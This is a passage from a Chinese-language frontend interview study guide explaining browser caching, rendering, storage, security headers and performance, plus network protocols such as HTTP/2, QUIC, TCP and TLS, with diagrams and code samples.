检查 Cache-Control: max-age / Expires (强缓存)
         │
    ┌────┴────┐
    │  命中    │ 不命中
    ▼         ▼
直接使用缓存   检查 ETag / Last-Modified (协商缓存)
(200 OK)          │
             ┌────┴────┐
             │  命中    │ 不命中
             ▼         ▼
         使用缓存    发送条件请求
         (304)       (If-None-Match / If-Modified-Since)
                         │
                   ┌─────┴─────┐
                   │ 服务端确认 │
                   ▼           ▼
              304 Not        200 返回
              Modified       新资源
```

#### 强缓存详解

```http
# 优先级: Cache-Control > Expires（Expires 是 HTTP/1.0 遗留字段）
Cache-Control: max-age=3600           # 相对时间，3600秒后过期
Cache-Control: s-maxage=7200          # 代理服务器（CDN）缓存时间
Cache-Control: no-cache               # 每次使用前必须和服务器确认（走协商缓存）
Cache-Control: no-store               # 完全不缓存（包括磁盘）
Cache-Control: public                  # 可被任何节点缓存（浏览器、CDN、代理）
Cache-Control: private                # 只有浏览器能缓存，CDN/代理不能缓存
Cache-Control: must-revalidate        # 缓存过期后必须从源站验证
Cache-Control: immutable              # 响应内容永远不会变（对版本化资源很有用）
Expires: Mon, 01 Jan 2027 00:00:00 GMT  # 绝对时间（注意：依赖客户端时钟）
```

#### no-cache vs no-store 区别

```javascript
// no-cache: 等价于"使用前必须重新验证"
// 浏览器仍会缓存，但每次使用前发送条件请求到服务器确认
// 适用场景：敏感数据或需要确保最新的资源，但不想每次都下载完整内容
// 行为: Cache-Control: no-cache  ->  发送 If-None-Match 请求 -> 304/200

// no-store: 完全不缓存，任何地方都不存储
// 适用场景：包含敏感信息（密码、Token、PII）的响应
// 行为: 完全不缓存，每次都从服务器重新获取
// 安全: 金融网站、登录接口必须用 no-store
```

#### 协商缓存详解

```http
# 服务端响应头（告诉浏览器缓存的标识）
ETag: "abc123def456"        # 文件内容的哈希/版本标识（精确）
Last-Modified: Tue, 01 Jan 2026 12:00:00 GMT  # 文件最后修改时间（粗粒度）

# 浏览器后续请求头（带上缓存标识，询问服务器是否过期）
If-None-Match: "abc123def456"     # 对应 ETag
If-Modified-Since: Tue, 01 Jan 2026 12:00:00 GMT  # 对应 Last-Modified
```

#### ETag vs Last-Modified 对比

| 特性 | ETag | Last-Modified |
|------|------|--------------|
| 精度 | 精确（内容哈希） | 粗粒度（秒级） |
| 精度问题 | 小文件秒内修改可能丢失 | 无法区分秒内多次修改 |
| 性能 | 需计算哈希（CPU消耗） | 直接读文件时间（快速） |
| 分布式兼容 | 需确保多服务器 ETag 一致 | 天然一致（文件系统时间） |
| 推荐场景 | API 响应、频繁更新的动态内容 | 静态文件、大文件 |

#### 代码示例：强制缓存 + 协商缓存实践

```javascript
// 服务器端 Express 示例
const crypto = require('crypto');
const fs = require('fs');

app.get('/static/:filename', (req, res) => {
  const filePath = path.join(__dirname, 'public', req.params.filename);
  const stat = fs.statSync(filePath);
  const mtime = stat.mtime.toUTCString();
  const etag = `W/"${crypto.createHash('sha1').update(fs.readFileSync(filePath)).digest('base64')}"`;

  // 协商缓存
  if (req.headers['if-none-match'] === etag) {
    return res.status(304).end();
  }
  if (req.headers['if-modified-since'] === mtime) {
    return res.status(304).end();
  }

  // 强缓存: HTML 不缓存，其他资源长期缓存 + 版本化
  if (req.params.filename.endsWith('.html')) {
    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  } else {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }

  res.setHeader('ETag', etag);
  res.setHeader('Last-Modified', mtime);
  res.sendFile(filePath);
});
```

---

### 5.8 浏览器渲染流程

#### 渲染流水线

```
HTML 字符串
    │
    ▼
┌─────────────────┐
│  HTML Parser     │  ── Tokenizer ──> HTML Token 流
│  (HTML 解析器)    │
└────────┬────────┘
         │ 构建 DOM 节点
         ▼
┌─────────────────┐
│   DOM Tree      │  ← JS 可以通过 DOM API 操作
│   (DOM 树)       │
└────────┬────────┘
         │ + CSSOM 更新通知
         ▼
┌─────────────────┐
│  Style          │  计算每个 DOM 节点的 Computed Style
│  (样式计算)       │
└────────┬────────┘
         │ 可见节点
         ▼
┌─────────────────┐
│  Render Tree   │  ← 不包含 display:none 节点
│  (渲染树)        │    包含每个可见节点的样式信息
└────────┬────────┘
         │ Layout 信息
         ▼
┌─────────────────┐
│  Layout        │  计算几何信息 (x, y, width, height)
│  (布局/回流)     │  任何改变几何属性的操作都触发回流
└────────┬────────┘
         │ Paint 信息
         ▼
┌─────────────────┐
│  Paint          │  生成绘制记录 (Paint Records)
│  (绘制)          │  确定绘制顺序（按 z-index 分层）
└────────┬────────┘
         │ Layer 信息
         ▼
┌─────────────────┐
│  Composite      │  合成层分组 -> 光栅化 -> 合成帧
│  (合成)          │
└─────────────────┘
```

#### CSS 选择器优先级

```javascript
// CSS 选择器优先级（从低到高）:
/*
  0. 通配符 *             -> 0,0,0,0
  1. 标签选择器 p          -> 0,0,0,1
  2. 类选择器 .active      -> 0,0,1,0
  3. 属性选择器 [type=text] -> 0,0,1,0
  4. 伪类 :hover           -> 0,0,1,0
  5. ID 选择器 #header     -> 0,1,0,0
  6. 行内样式 style=""     -> 1,0,0,0
  7. !important            -> 最高优先级（覆盖上述所有）
*/
```

#### DOM Tree 与 Render Tree 生成

```
DOM Tree:                              Render Tree:
                                       
html ──> html                           html
  ├── head ──> head (不可见，跳过)          │
  │     └── link ──> link (不可见，跳过)    │
  └── body ──> body                     body
        ├── div ──> div                 ├── div (可见, 包含样式)
        │     └── "text" ──> text       │     └── "text"
        └── p#intro ──> p (可见)          └── p#intro (可见, 包含样式)
              └── "Hello" ──> text            └── "Hello"

注: display:none 元素的节点从 DOM 中保留，但不出现在 Render Tree 中
    visibility:hidden 元素出现在 Render Tree 中，但不可见
```

---

### 5.9 Layout vs Paint vs Composite

| 阶段 | 触发条件 | 性能影响 | 解决方式 |
|------|---------|---------|---------|
| **Reflow（回流/布局）** | 几何属性变化（width/height/padding/margin/offsetTop...） | 最严重，整个布局树重新计算 | 批量DOM操作、DOM离线化 |
| **Repaint（重绘）** | 外观变化不影响布局（color/background/border-radius...） | 中等，不需要重新布局 | 使用 CSS transform/opacity |
| **Composite（合成）** | 仅 transform/opacity 变化 | 最轻，仅合成层合并 | 启用 GPU 加速（will-change） |

#### 回流（Reflow）触发条件

```javascript
// 读写交替导致强制同步回流（最糟糕的性能陷阱）
// Bad Example - 强制同步布局抖动:
for (const el of manyElements) {
  el.style.width = el.offsetWidth + 10 + 'px';  // 读 -> 触发回流
  el.style.height = el.offsetHeight + 10 + 'px'; // 读 -> 再次触发回流
}
// 每次循环都触发同步回流（Layout Thrashing）

// Good Example - 批量读，批量写:
const widths = [];  // 先读所有
for (const el of manyElements) {
  widths.push(el.offsetWidth);
}
for (let i = 0; i < manyElements.length; i++) {  // 再写所有
  manyElements[i].style.width = widths[i] + 10 + 'px';
}

// 导致回流的常见操作:
window.getComputedStyle()     // 读
element.offsetHeight          // 读
element.scrollTop             // 读
element.getBoundingClientRect() // 读

// 不会导致回流的属性（合成线程完成）:
element.style.transform = 'translateX(100px)'  // 合成属性
element.style.opacity = '0.5'                   // 合成属性
```

#### 浏览器分层与合成层

```
页面分层（Layer Tree）:
+------------------------+
| Compositor Thread      |
+------------------------+
| Layer 1 (z-index: 3)   |  ← GPU 合成层，单独光栅化
|   - 固定头部导航         |     transform: translateZ(0)
|                         |     will-change: transform
+------------------------+
| Layer 2 (z-index: 2)   |  ← GPU 合成层
|   - modal 弹窗          |
+------------------------+
| Main Layer             |  ← 主线程管理的默认层
|   - 普通内容             |
+------------------------+
```

#### GPU 合成原理

```
1. 分层: 渲染引擎根据特定规则将页面分为多个合成层 (Compositing Layers)
   触发合成层的常见条件:
   - transform: translateZ(0) / translate3d()
   - will-change: transform / opacity
   - position: fixed
   - <video> / <canvas> / WebGL
   - CSS filter

2. 光栅化: 每个合成层在合成线程中独立光栅化（Rasterization）

3. 合成: 将各层的位图纹理按 z-index 叠加
   - 使用 GPU 的纹理合成能力（Texture Compositing）

4. 动画/滚动: transform 和 opacity 的动画完全在合成线程执行
   - 不需要主线程参与 -> 60fps+ 的流畅动画
```

---

### 5.10 CSS 阻塞渲染 vs JS 阻塞解析

#### CSS 阻塞渲染

```html
<!-- CSS 是渲染阻塞资源 (Render Blocking Resource) -->
<!-- 原因：避免无样式内容闪烁 (FOUC) -->

<head>
  <!-- 阻塞渲染：必须加载和处理完 CSS 才能渲染 -->
  <link rel="stylesheet" href="styles.css" />

  <!-- 非关键 CSS 应异步加载：-->
  <link rel="stylesheet" href="non-critical.css"
        media="print" onload="this.media='all'" />
</head>
```

#### JS 阻塞解析

```html
<body>
  <!-- JS 默认阻塞 HTML 解析器 -->
  <!-- 原因：JS 可能 document.write() 改变 DOM 结构 -->

  <!-- 普通脚本 — 阻塞解析 -->
  <script src="analytics.js"></script>

  <!-- defer 脚本 — 不阻塞解析 -->
  <script src="app.js" defer></script>

  <!-- async 脚本 — 不阻塞解析 -->
  <script src="analytics.js" async></script>

  <!-- 模块脚本 — 默认 defer 行为 -->
  <script type="module" src="app.js"></script>
</body>
```

#### defer vs async 对比

```
时间轴:
|--- HTML Parsing ---|-- PAINT --|
                                     (defer 执行点)
                      (async 执行点，立即)

Case: <script src="a.js" defer></script>
  HTML 解析 ────────── [a.js 完成后执行]
  a.js 下载 ──────────────────────────────────

Case: <script src="b.js" async></script>
  HTML 解析 ────────
  b.js 下载 ─── [b.js 执行] ─────────────────
                (下载完立即执行，不保证顺序)

Case: <script src="c.js"></script> (无属性)
  HTML 解析 ──────────── [c.js 执行] ──────────
  c.js 下载 ──────────────────────────────────
```

| 特性 | 无属性 | defer | async |
|------|-------|-------|-------|
| 是否阻塞 HTML 解析 | 是 | 否 | 否 |
| 执行时机 | 解析时立即执行 | DOM完成后 | 下载完立即执行 |
| 执行顺序 | 出现顺序 | 出现顺序 | 不保证顺序 |
| 适用场景 | 依赖 DOM 的同步脚本 | 大部分场景（推荐） | 独立脚本（分析/广告） |

#### preload vs prefetch

```html
<!-- preload: 提前加载当前导航需要的资源（高优先级） -->
<link rel="preload" href="font.woff2" as="font" crossorigin="anonymous" />
<link rel="preload" href="critical.js" as="script" />

<!-- prefetch: 提前加载未来导航可能需要的资源（低优先级） -->
<link rel="prefetch" href="next-page.html" />
<link rel="prefetch" href="bundle.js" as="script" />

<!-- preconnect: 提前建立 TCP/TLS 连接 -->
<link rel="preconnect" href="https://api.example.com" />
```

---

### 5.11 浏览器事件机制

#### 冒泡 vs 捕获完整图解

```
事件流三个阶段:

捕获阶段 (Capture Phase) — 从根节点往下到目标节点
  window -> document -> <html> -> <body> -> <div>

目标阶段 (Target Phase) — 在目标节点上
  <div onclick="...">
  事件处理在目标元素上按添加顺序执行

冒泡阶段 (Bubble Phase) — 从目标节点往上到根节点
  <div> -> <body> -> <html> -> document -> window
```

```javascript
// 完整事件监听示例
const div = document.getElementById('outer');

// 捕获阶段处理（第三个参数为 true）
div.addEventListener('click', handler, true);

// 冒泡阶段处理（第三个参数为 false 或省略）
div.addEventListener('click', handler, false);

// 事件委托（利用冒泡）
document.getElementById('list').addEventListener('click', (e) => {
  const target = e.target.closest('li');
  if (target) {
    console.log('Clicked li:', target.textContent);
  }
  e.stopPropagation();
});

// passive 优化：提升滚动流畅度
window.addEventListener('scroll', handler, { passive: true });
```

#### 不会冒泡的事件

```javascript
const nonBubblingEvents = [
  'focus', 'blur', 'load', 'unload', 'error',
  'mouseenter', 'mouseleave',
  'scroll',  // 在 window/document 上使用 passive 优化
];
```

---

### 5.12 localStorage / sessionStorage / IndexedDB

| 特性 | localStorage | sessionStorage | IndexedDB |
|------|-------------|----------------|-----------|
| 容量 | ~5MB | ~5MB | ~50MB+（可请求更多） |
| 生命周期 | 永久（除非手动清除） | 标签页关闭时清除 | 永久（除非手动清除） |
| 作用域 | 同源（协议+域名+端口） | 同源 + 同标签页 | 同源 |
| 线程 | 主线程同步访问 | 主线程同步访问 | 异步 API |
| 数据类型 | 仅字符串 | 仅字符串 | 支持 Blob/File/结构化对象 |
| 支持索引 | 否 | 否 | 是 |

```javascript
// localStorage 示例
localStorage.setItem('user', JSON.stringify({ name: 'Alice', age: 30 }));
const user = JSON.parse(localStorage.getItem('user'));

// 监听变化（其他同源标签页会收到通知）
window.addEventListener('storage', (e) => {
  console.log(`Key: ${e.key}, Old: ${e.oldValue}, New: ${e.newValue}`);
});

// IndexedDB 示例
const request = indexedDB.open('MyDatabase', 1);

request.onsuccess = () => {
  const db = request.result;
  const tx = db.transaction('users', 'readwrite');
  const store = tx.objectStore('users');
  store.put({ id: 'alice', name: 'Alice', age: 30 });
};
```

---

### 5.13 浏览器跨 Tab 通信

```
通信方式全景:

Tab A                          Tab B
  │                               │
  │── BroadcastChannel ──────────>│
  │── localStorage + storage 事件 ─>│
  │── SharedWorker ─────────────>│
  │── postMessage ─────────────>│  (需引用对方 window 对象)
```

#### BroadcastChannel（现代，推荐）

```javascript
// Tab A
const channel = new BroadcastChannel('my-channel');
channel.postMessage({ type: 'UPDATE', data: { user: 'Alice' } });

// Tab B
const channel = new BroadcastChannel('my-channel');
channel.onmessage = (e) => console.log('Received:', e.data);
```

#### SharedWorker

```javascript
// shared-worker.js
const connections = new Set();
self.onconnect = (e) => {
  const port = e.ports[0];
  connections.add(port);
  port.onmessage = (e) => {
    connections.forEach(p => {
      if (p !== port) p.postMessage(e.data);
    });
  };
  port.start();
};

// 使用
const worker = new SharedWorker('shared-worker.js');
worker.port.onmessage = (e) => console.log('From other tab:', e.data);
```

#### localStorage + storage 事件

```javascript
// Tab A 写入，Tab B 监听变化
localStorage.setItem('syncData', JSON.stringify({ counter: 42 }));

// Tab B 监听
window.addEventListener('storage', (e) => {
  console.log(e.key, e.oldValue, e.newValue);
});
```

---

### 5.14 Cookie：大小限制与跨域限制

```javascript
// Cookie 大小限制
// - 每个 cookie 最大 4KB（RFC 6265 规范）
// - 单个域名下所有 cookie 总数通常限制在 150-180 个

// 设置 Cookie（服务器端 Set-Cookie）
Set-Cookie: sessionId=abc123; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600

// HttpOnly: JS 无法读取（防 XSS）
// Secure: 仅 HTTPS 传输
// SameSite: 防 CSRF 攻击
//   - Strict: 完全禁止跨站 cookie（最安全）
//   - Lax: 允许导航 GET 请求携带 cookie（默认）
//   - None: 允许跨站 cookie（必须配合 Secure）
```

---

### 5.15 同源策略、CSP、iframe sandbox

#### 同源策略（Same-Origin Policy）

```
同源定义: 协议 + 域名 + 端口 三者完全相同

示例:
https://example.com:443 (基准)
  ✅ https://example.com:443 (同源)
  ✅ https://example.com/ (同源)
  ❌ http://example.com:443 (协议不同)
  ❌ https://sub.example.com:443 (子域名不同)
  ❌ https://example.com:8080 (端口不同)
```

#### CSP（Content Security Policy）

```http
# 服务器响应头设置 CSP
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  frame-ancestors 'none';
  report-uri /csp-violation;
```

#### iframe sandbox

```html
<iframe
  src="https://untrusted.example.com/page.html"
  sandbox="
    allow-scripts
    allow-forms
    allow-same-origin
    allow-top-navigation
    allow-popups
  "
></iframe>

<!-- 最严格的 sandbox（完全不信任的内容） -->
<iframe src="untrusted.html" sandbox></iframe>
```

---

### 5.16 浏览器内存泄漏排查

#### 常见内存泄漏场景

```javascript
// 场景1: 全局变量（隐式全局变量）
function leak() {
  temp = 'this creates a global variable';  // 未声明的变量挂在 window 上
}

// 场景2: 定时器未清理
const intervalId = setInterval(() => console.log(heavyData), 1000);
clearInterval(intervalId);

// 场景3: 事件监听器未移除
element.addEventListener('click', handler);
element.removeEventListener('click', handler);

// 场景4: 闭包引用
function createLeak() {
  const largeArray = new Array(100000).fill('x');
  return () => console.log(largeArray.length);
}

// 场景5: 分离的 DOM 引用
const detachedNodes = [];
const div = document.createElement('div');
document.body.appendChild(div);
document.body.removeChild(div);
detachedNodes.push(div);  // 内存泄漏
```

#### Performance API 使用

```javascript
// 1. 获取内存信息（Chrome 浏览器）
const memoryInfo = performance.memory;
console.log({
  usedJSHeapSize: memoryInfo.usedJSHeapSize / 1024 / 1024,
  totalJSHeapSize: memoryInfo.totalJSHeapSize / 1024 / 1024,
});

// 2. Performance Observer — 监控长任务
const observer = new PerformanceObserver((list) => {
  for (const entry of list.getEntries()) {
    if (entry.duration > 50) {
      console.log('Long Task detected:', entry.duration, 'ms');
    }
  }
});
observer.observe({ entryTypes: ['longtask'] });

// 3. 监控 FP / FCP / LCP
const paintObserver = new PerformanceObserver((list) => {
  list.getEntries().forEach((entry) => {
    console.log(entry.name, entry.startTime.toFixed(2), 'ms');
  });
});
paintObserver.observe({ entryTypes: ['paint', 'largest-contentful-paint'] });

// 4. Timeline 分析
performance.mark('start-operation');
performance.mark('end-operation');
performance.measure('Duration', 'start-operation', 'end-operation');
```

#### Lighthouse 原理

```
Lighthouse 工作流程:

1. 启动: 通过 Chrome DevTools Protocol (CDP) 控制无头浏览器

2. 加载页面: 通过 CDP 导航到目标 URL

3. 全局检查:
   - Service Worker 检查
   - Computed CSS 收集
   - DOM 树信息收集

4. 运行 Auditors（审计项）:
   ┌──────────────────┬──────────────────┬──────────────────┐
   │ Performance      │ PWA              │ Best Practices   │
   ├──────────────────┼──────────────────┼──────────────────┤
   │ FCP / LCP        │ manifest         │ image aspect    │
   │ TBT / TTI        │ service worker   │ deprecated APIs │
   │ CLS              │ offline          │ HTTPS           │
   │ Speed Index      │ installable      │ console errors  │
   └──────────────────┴──────────────────┴──────────────────┘

5. 生成报告:
   - 计算加权总分（0-100）
   - 输出优化建议（Opportunities + Diagnostics）
   - 支持 HTML/JSON/CSV 格式

6. Lighthouse CI: 可集成到 CI/CD，阻止性能退化
```

---

### 5.17 浏览器性能优化

#### 渲染性能优化

```javascript
// 1. 减少回流/重绘
// Bad
element.style.width = element.offsetWidth + 10 + 'px';
// Good: 使用 transform（合成线程，不触发回流）
element.style.transform = `translateX(${element.offsetWidth + 10}px)`;

// 2. will-change 优化动画性能
.animated-element {
  will-change: transform;
  transform: translateZ(0);
}

// 3. 批量 DOM 操作
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  fragment.appendChild(document.createElement('li'));
}
list.appendChild(fragment);

// 4. DOM 离线化
const hidden = document.createElement('div');
hidden.style.display = 'none';
document.body.appendChild(hidden);
// 在 hidden 中大量操作 DOM ...
document.body.removeChild(hidden);
```

#### 资源调度优化

```
Preload Scanner 原理:

HTML 解析器在解析 HTML 时会暂停以执行 JS（JS 阻塞解析）
但 Preload Scanner 是一个轻量级后台扫描器（后台运行），
即使主线程被 JS 阻塞，它也能发现 <link>/<img>/<script> 等资源，
提前发起网络请求，充分利用网络带宽。

Code Splitting 实践:
import('module.js').then(module => module.doSomething());

// React.lazy 实现路由级代码分割
const Dashboard = React.lazy(() => import('./Dashboard'));
<Suspense fallback={<Loading />}>
  <Dashboard />
</Suspense>
```

---

## Chapter 6: 网络协议超完整题库

### 6.1 HTTP/1.0 vs HTTP/1.1 vs HTTP/2 vs HTTP/3

#### 版本演进全景

```
HTTP/0.9 (1991)  ── 单行协议，只支持 GET，无 header
HTTP/1.0 (1996)  ── 引入请求头/响应头、MIME 类型
HTTP/1.1 (1997)  ── 引入 keep-alive、管道化、缓存控制
HTTP/2 (2015)    ── 二进制分帧、多路复用、HPACK 压缩
HTTP/3 (2022)    ── QUIC (UDP) 替代 TCP，消除 TCP 队头阻塞
```

#### HTTP/1.1 的队头阻塞

```
HTTP/1.1 管道化（仍受队头阻塞影响）:

客户端                                    服务器
  ├─ GET /a.html ────────────────────────> │
  ├─ GET /b.html ───────────────────────> │  管道中，后面的请求
  ├─ GET /c.html ─────────────────────> │  等待队首响应
  │                                        │
  │<────────── Response: a.html ─────────┤  (a 响应慢，b/c 被卡)
  │<────────── Response: b.html ─────────┤  (即使 b 已准备好)
  │                                        │
  问题: 队首的慢响应会阻塞后续所有请求

  现代浏览器解决方案: 多个 TCP 连接（通常 6 个）
```

#### HTTP/2 多路复用

```
HTTP/2 帧结构:
+---------------+---------------+---------------+
| Length (3B)   | Type (1B)     | Flags (1B)    |
+---------------+---------------+---------------+
|              Stream Identifier (4B)           |
+-----------------------------------------------+
|               Frame Payload (...)             |
+-----------------------------------------------+

HTTP/2 帧类型:
  DATA      ── 传输实际数据（请求体/响应体）
  HEADERS   ── 传输首部
  SETTINGS  ── 连接级配置
  WINDOW_UPDATE ── 流控
  PING      ── 心跳检测

多路复用示例:
Stream 1 (GET /index.html):
  HEADERS (stream=1) + DATA (stream=1)
Stream 3 (GET /style.css):
  HEADERS (stream=3) + DATA (stream=3)
Stream 5 (GET /app.js):
  HEADERS (stream=5) + DATA (stream=5)

帧在同一个 TCP 连接上交织返回，完全并行，无队头阻塞
```

#### HTTP/2 仍有队头阻塞的原因

```
问题: HTTP/2 在 TCP 层仍有队头阻塞

原因: TCP 保证字节序（字节流），丢包会导致重传

       Stream 1: [A][B][C][D][E][F][G][H]...
       Stream 3: [a][b][c][d][e][f][g][h]...

       帧序列在 TCP 流中:
       [A][a][B][b][C][c][D][d]...
                  ↑
              Stream 3 的 [c] 丢失
              TCP 层重传 [c]

       Stream 1 的 [D] 虽然到达，但 TCP 层必须等 [c] 收到后才能交付
       → HTTP/2 的所有流都被阻塞（即使这些流的数据都完好）

HTTP/3 的解决: QUIC 替代 TCP，每个流独立流控，丢包只影响该流
```

#### HPACK 头部压缩原理

```
HPACK 使用两个表压缩:

1. 静态表 (Static Table): 已知常见的 Header Field
   Index 1: :authority
   Index 2: :method GET
   Index 4: :path /
   ...
   Index 33: content-type: text/plain
   ...

2. 动态表 (Dynamic Table): 动态维护当前连接中出现过的 Header

3. Huffman 编码: 对字符串值进行 Huffman 编码

结果: 重复 Header 只传输 index（1-2 bytes），节省约 60-90% Header 开销
```

#### HTTP/3 与 QUIC

```
HTTP/3 协议栈:
+-----------------------------+
|         HTTP/3              |  应用层
+-----------------------------+
|          QUIC               |  (可靠的 UDP)
|  +-----------------------+  |
|  |  Stream 1             |  |  每个流独立
|  |  Stream 2             |  |  流控，无队头阻塞
|  |  Stream 3             |  |
|  +-----------------------+  |
|  |  Connection ID        |  |  连接迁移
|  |  0-RTT / 1-RTT 握手   |  |
|  +-----------------------+  |
+-----------------------------+
|          UDP                |  传输层
+-----------------------------+
```

---

### 6.2 HTTP 为什么无状态，keep-alive 原理

#### 无状态设计

```http
HTTP 无状态 = 服务器不保存任何客户端请求的历史信息

为什么无状态？
1. 可扩展性: 服务器可以任意水平扩展（无状态 = 任何服务器处理任何请求）
2. 简单性: 服务器逻辑简单，不需要维护会话状态
3. 可靠性: 服务器崩溃不丢失状态（状态在客户端）

有状态 = 在应用层实现（Cookie/Token/自定义 Header）
```

#### keep-alive（持久连接）

```http
HTTP/1.0 时代: 每个请求都建立新的 TCP 连接，用完即关闭

HTTP/1.1 时代: 默认开启 keep-alive，多个请求复用同一 TCP 连接
+--TCP连接--><--请求1--><--响应1--><--请求2--><--响应2--><--请求3--><--响应3--><--关闭-->

请求头:
Connection: keep-alive  (HTTP/1.0 需要，HTTP/1.1 默认)
Keep-Alive: timeout=5, max=1000
```

---

### 6.3 QUIC 为什么基于 UDP，QUIC 如何保证可靠性

#### 为什么选择 UDP

```
重新设计传输层协议的现实障碍:
1. 需要操作系统内核支持（更新内核协议栈 = 不可能）
2. 需要网络中间设备（路由器、防火墙）支持
3. UDP 已有广泛部署，无上述问题

QUIC = 在用户态实现可靠传输（绕过内核限制，快速迭代）
```

#### QUIC 可靠性实现

```
QUIC 丢包恢复机制:

1. 丢包检测:
   - 超时检测: 包发出后一段时间未收到 ACK，超时重传
   - Duplicate ACK: 收到 3 个 ACK（同一 seq 未 ACK）

2. ACK Ranges（选择性确认）:
   QUIC ACK 帧携带"接收到的包范围"，比 TCP 的 SACK 更精确

3. 连接迁移（Connection Migration）:
   - 每个连接有一个 Connection ID（可变）
   - 客户端切换网络（WiFi->4G）时，继续使用同一 Connection ID
   - 数据包到达新 IP，QUIC 层自动更新连接路径
   - 无需重新建立连接（TCP 会断开重连）
```

---

### 6.4 TCP vs UDP vs QUIC

| 特性 | TCP | UDP | QUIC |
|------|-----|-----|------|
| 连接性 | 面向连接 | 无连接 | 面向连接（逻辑） |
| 可靠性 | 可靠传输 | 不可靠 | 可靠传输 |
| 顺序性 | 保序 | 不保序 | 保序（流内） |
| 拥塞控制 | 有 | 无 | 有 |
| 头部大小 | 20B | 8B | 20-40B (可变) |
| 队头阻塞 | 有（传输层） | 无 | 无（流内） |
| 连接迁移 | 不支持 | 不支持 | 支持 |
| 握手延迟 | 1-RTT | 0-RTT | 1-RTT / 0-RTT |

---

### 6.5 TCP 拥塞控制、滑动窗口、流量控制

#### TCP 滑动窗口

```
发送方滑动窗口（以字节为单位）:

已发送并 ACK  │ 已发送未 ACK │   可发送区域    │   不能发送
[SENT & ACKED] │  [SENT NOT ACK] │  [NOT SENT]  │   [CANNOT SEND]
                ←──────────────────→←─────────────→
                ↑                  ↑             ↑
              SND.UNA           SND.NND       SND.UNA + SND.WND

流量控制: 防止发送方超过接收方的处理能力 → 工具: rwnd
拥塞控制: 防止发送方超过网络的承载能力 → 工具: cwnd
发送窗口 = min(rwnd, cwnd)
```

#### 拥塞控制四算法

```
1. 慢启动 (Slow Start):
   - cwnd 初始值 = 1 MSS
   - 每收到一个 ACK，cwnd += 1 MSS
   - 指数增长，直到达到 ssthresh

2. 拥塞避免 (Congestion Avoidance):
   - 每收到一个 ACK，cwnd += MSS²/cwnd
   - 线性增长（每 RTT 增加 1 MSS）

3. 快速重传 (Fast Retransmit):
   - 收到 3 个 Duplicate ACK（同一 seq 未 ACK）
   - 不等超时，立即重传丢失的包

4. 快速恢复 (Fast Recovery):
   - cwnd = ssthresh + 3*MSS
   - 收到新 ACK 后进入拥塞避免
```

---

### 6.6 SYN Flood 与防御

```
SYN Flood 攻击原理:

攻击者发送大量 SYN 包，但不完成三次握手
服务器维护大量半开连接 (SYN_RECV)，消耗资源

防御机制:
1. SYN Cookies:
   - 服务器不保存半开连接
   - 用加密 Cookie (seq = hash(...))
   - 完成第三次握手时验证 Cookie 才建立连接

2. SYN Cache:
   - 压缩半开连接信息（不保存完整 TCB）

3. 限流:
   - 限制来自单个 IP 的 SYN 速率

4. DDoS 防护服务:
   - Cloudflare, Akamai 等
```

---

### 6.7 三次握手 vs 四次挥手

#### 为什么是三次握手，不是两次

```
两次握手的问题:
- 无法防止历史连接初始化混乱
- 无法同步初始序列号 (ISN)

三次握手完整过程:
  Client                                          Server
    │  ── SYN (seq=x) ──────────────────────> │  Client: 请求连接，发送 ISN=x
    │  <── SYN+ACK (seq=y, ack=x+1) <───────── │  Server: 同意连接，发送 ISN=y
    │  ── ACK (seq=x+1, ack=y+1) ───────────> │  握手完成，双方确认对方 ISN
```

#### 为什么是四次挥手

```
原因: TCP 是全双工通信，每个方向需要单独关闭

挥手详细过程:

Client                                        Server
  │  Client FIN ────────────────────────────> │  Client 发送完数据，请求关闭
  │  <── ACK ─────────────────────────────── │  Server 确认收到 FIN
  │       (Client 进入 FIN_WAIT_2)            │
  │  此时: Client -> Server 方向已关闭        │
  │        Server -> Client 方向仍开放        │
  │  Server 发送 FIN ────────────────────────> │  Server 也发送完数据，请求关闭
  │  <── ACK ──────────────────────────────── │  Client 确认收到 FIN
Client 等待 2MSL 后关闭                         Server 关闭连接
```

#### TIME_WAIT 存在的理由

```
为什么需要 TIME_WAIT（等待 2MSL）？

1. 保证最后 ACK 到达被动关闭方
   如果 Client 的最后一个 ACK 丢失:
   Server 会重发 FIN，Client 需要再次发送 ACK
   2MSL 确保 Server 有足够时间重传 FIN

2. 让旧连接的重复数据包在网络中消散
   旧连接的网络中可能还有延迟的数据包

3. MSL:
   Linux: MSL = 60 秒
   TIME_WAIT = 2 * MSL = 120-240 秒
```

---

### 6.8 HTTPS 握手流程、TLS 1.2 vs 1.3

#### HTTPS 握手（TLS 1.2）

```
TLS 1.2: 需要 2-RTT

Client                                        Server
  │  1. TCP 三次握手 ──────────────────────────────────> │
  │  ─── ClientHello ───────────────────────────────>  │ 支持的 TLS 版本、密码套件、SNI
  │  <── ServerHello ────────────────────────────────  │ 选择 TLS 版本
  │  <── Certificate ────────────────────────────────  │ 服务器证书链
  │  <── ServerHelloDone ───────────────────────────  │
  │  ─── ClientKeyExchange ────────────────────────>  │ 发送 pre-master secret
  │  双方计算 master secret                          │
  │  ─── ChangeCipherSpec ────────────────────────>  │
  │  <── ChangeCipherSpec ────────────────────────  │
  │  ─── Finished (加密) ──────────────────────────>  │
  │  <── Finished (加密) ──────────────────────────  │
  │  加密通信开始                                    │
```

#### TLS 1.3 优化

```
TLS 1.3: 只需要 1-RTT（首次）/ 0-RTT（后续）

1. 握手从 2-RTT 减少到 1-RTT
   TLS 1.3 将 Key Exchange 合并到第一次消息中

2. 0-RTT（抗重放攻击）
   第二次连接使用 session ticket (early_data)
   代价: 存在重放攻击风险

3. 移除不安全的密码套件
   TLS 1.3 只保留:
   - AEAD: AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305
   - 密钥交换: ECDHE
   移除: ❌ RSA 密钥传输, ❌ CBC 模式, ❌ SHA-1, ❌ MD5

4. 前向保密 (PFS) 默认启用
```

#### 对称加密 vs 非对称加密

```javascript
// 1. 对称加密（加密和解密用同一个密钥）
const crypto = require('crypto');
const key = crypto.randomBytes(32);
const iv = crypto.randomBytes(16);
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
let encrypted = cipher.update('secret data', 'utf8', 'hex');
encrypted += cipher.final('hex');
const authTag = cipher.getAuthTag();

// 2. 非对称加密（加密和解密用不同密钥）
const { generateKeyPairSync } = require('crypto');
